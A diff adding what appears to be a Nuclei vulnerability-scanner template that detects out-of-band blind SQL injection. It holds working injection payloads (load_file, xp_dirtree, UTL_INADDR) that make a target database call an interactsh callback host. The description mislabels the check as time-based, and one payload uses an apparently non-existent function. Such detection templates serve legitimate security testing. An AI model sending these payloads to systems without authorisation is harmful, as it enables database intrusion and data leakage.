@@ -1,0 +1,38 @@
+id: oob-based-sqli
+info:
+  name: oob-Based Blind SQL Injection
+  author: Bright
+  severity: Critical
+  description: Detects time-based blind SQL injection vulnerability
+http:
+  - method: GET
+    path:
+        - "{{BaseURL}}" 
+    payloads:
+      injection:
+      - "'+(select load_file('//{{interactsh-url}}/e'))+'"
+      - "(select load_file('//{{interactsh-url}}/c'))"
+      - "';EXEC master..xp_dirtree '//{{interactsh-url}}/s'--"
+      - ";EXEC master..xp_dirtree '//{{interactsh-url}}/s'--"
+      - "';DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '//{{interactsh-url}}/s');EXEC(@x)--"
+      - "||UTL_INADDR.get_host_address('{{interactsh-url}}')"
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+            - "{{injection}}"
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: http
+        words:
+          - "http"
+
+      - type: word
+        part: interactsh_protocol
+        name: dns
+        words:
+          - "dns"
